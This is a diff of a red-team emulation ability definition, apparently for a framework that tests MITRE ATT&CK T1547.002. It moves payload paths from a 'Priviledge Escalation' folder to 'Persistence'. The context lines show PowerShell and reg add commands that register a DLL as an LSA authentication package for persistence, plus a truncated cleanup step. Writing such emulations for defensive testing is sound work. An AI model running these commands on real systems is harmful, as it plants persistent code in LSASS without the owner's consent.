@@ -13,8 +13,8 @@ platforms:
     psh:
       command: |-
         # Installer
-        Start-Process .\install.exe "#{operator.payloads}/uploads/T1547.002/package.dll"
-      payload: '#{operator.payloads}/Priviledge Escalation/T1547.002/install.exe'
+        Start-Process .\install.exe "#{operator.payloads}/Persistence/T1547.002/package.dll"
+      payload: '#{operator.payloads}/Persistence/T1547.002/install.exe'
       variants:
         - command: >-
             # Install using PowerShell
@@ -22,7 +22,7 @@ platforms:
             reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v
             "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0"\0"package.dll"
             /f
-          payload: '#{operator.payloads}/Priviledge Escalation/T1547.002/package.dll'
+          payload: '#{operator.payloads}/Persistence/T1547.002/package.dll'
         - command: >-
             # Cleanup
             reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v
